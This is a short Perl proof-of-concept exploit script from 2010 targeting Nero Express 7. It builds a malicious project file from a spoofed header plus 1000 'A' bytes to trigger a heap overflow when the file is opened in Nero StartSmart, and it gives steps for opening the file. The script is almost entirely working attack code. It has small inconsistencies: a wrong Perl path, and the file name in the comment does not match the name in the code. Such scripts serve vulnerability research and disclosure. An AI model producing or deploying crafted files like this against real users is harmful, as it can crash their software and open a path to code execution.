#!/user/bin/perl
# Exploit Title: [Nero Express7 Local Heap Poc]
# Date: [2010/01/01]
# Author: [D3V!L FUCKER]
# Version: [Nero Express7 Ver.7.9.6.4]
# Tested on: [windows vista sp0]
#After Setup Open Nero StartSmart Essentials => Favorites => Open Projects => explit.nir
# Code :
$headr=
"\xFF\xFE\xFF\x0E\x4E\x00\x65\x00\x72\x00\x6F\x00\x49\x00\x53\x00".
"\x4F\x00\x30\x00\x2E\x00\x30\x00\x33\x00\x2E\x00\x30\x00\x31\x00";

$boom="A" x 1000;

open(myfile,'>>exploit.nri') || die "Cannot Creat file\n\n";
print myfile $headr;
print myfile $boom;
print "Done..!~#\n";